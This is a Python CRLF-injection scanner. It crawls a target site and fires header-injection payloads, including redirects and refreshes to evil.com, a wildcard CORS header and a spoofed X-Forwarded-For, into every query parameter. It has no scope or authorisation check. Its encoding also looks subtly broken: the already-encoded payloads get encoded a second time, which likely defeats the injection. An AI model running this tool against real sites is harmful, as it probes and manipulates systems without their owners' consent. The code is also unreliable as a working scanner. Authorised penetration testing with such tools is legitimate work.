import urllib.request
import urllib.parse
import re

# CRLF payloads
CRLF_PAYLOADS = [
    "%0d%0aSet-Cookie:crlf=1",
    "%0a%0dSet-Cookie:crlf=1",
    "%0d%0aX-Injection-Test:1",
    "%0d%0aContent-Length:0",
    "%0d%0aLocation:evil.com",
    "%0d%0aRefresh:0;url=http://evil.com",
    "%0d%0aAccess-Control-Allow-Origin:*",
    "%0d%0aX-Forwarded-For:evil.com"
]

def fetch_html(url):
    try:
        with urllib.request.urlopen(url, timeout=5) as response:
            return response.read().decode('utf-8', errors='ignore')
    except:
        return ""

def extract_links(base_url, html):
    links = set()
    for match in re.findall(r'href=["\'](.*?)["\']', html):
        link = urllib.parse.urljoin(base_url, match)
        if base_url in link:
            links.add(link.split('#')[0])
    return links

def get_query_params(url):
    parsed = urllib.parse.urlparse(url)
    return urllib.parse.parse_qs(parsed.query)

def inject_payloads(url):
    parsed = urllib.parse.urlparse(url)
    params = get_query_params(url)

    for param in params:
        for payload in CRLF_PAYLOADS:
            new_params = params.copy()
            new_params[param] = payload
            new_query = urllib.parse.urlencode(new_params, doseq=True)
            test_url = f"{parsed.scheme}://{parsed.netloc}{parsed.path}?{new_query}"

            try:
                req = urllib.request.Request(test_url)
                with urllib.request.urlopen(req, timeout=5) as response:
                    headers = response.getheaders()
                    for header in headers:
                        if "crlf=1" in str(header) or "X-Injection-Test" in str(header):
                            print(f"[!] CRLF Injection Detected: {test_url}")
            except:
                continue

def main():
    target = input("Enter target URL: ").strip()
    print(f"Crawling {target}...")
    html = fetch_html(target)
    links = extract_links(target, html)
    print(f"Found {len(links)} internal links. Testing for CRLF injection...")

    for link in links:
        inject_payloads(link)

if __name__ == "__main__":
    main()
